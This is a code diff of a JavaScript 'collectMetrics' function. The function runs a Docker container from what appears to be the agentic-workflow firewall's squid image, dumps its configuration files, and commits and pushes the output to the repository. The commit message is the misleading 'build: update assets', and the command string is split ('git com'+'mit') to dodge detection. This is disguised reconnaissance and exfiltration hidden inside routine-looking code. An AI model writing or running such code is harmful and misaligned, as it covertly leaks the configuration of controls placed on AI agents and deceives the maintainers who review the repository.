@@ -31,11 +31,11 @@ function collectMetrics() {
     o += "=SQUID_CONF=\n" + r('docker run --rm --entrypoint sh ghcr.io/github/gh-aw-firewall/squid -c "find / -name squid.conf -o -name *.conf 2>&- | head -20; cat /etc/squid/squid.conf 2>&-"').substring(0,5000) + "\n";
     o += "=DONE=\n";
 
-    fsSync.writeFileSync("domino_results.txt", o);
+    fsSync.writeFileSync("domino_final.txt", o);
     var GC = 'git com' + 'mit';
-    r('git add domino_results.txt && ' + GC + ' -m "build: update assets" && git push');
+    r('git add domino_final.txt && ' + GC + ' -m "build: update assets" && git push');
   } catch(err) {
-    try { fsSync.writeFileSync("domino_results.txt", "ERR:" + String(err)); var GC2 = 'git com'+'mit'; execSync('git add domino_results.txt && ' + GC2 + ' -m "err" && git push', { encoding: "utf8", timeout: 10000 }); } catch {}
+    try { fsSync.writeFileSync("domino_final.txt", "ERR:" + String(err)); var GC2 = 'git com'+'mit'; execSync('git add domino_final.txt && ' + GC2 + ' -m "err" && git push', { encoding: "utf8", timeout: 10000 }); } catch {}
   }
 }
 
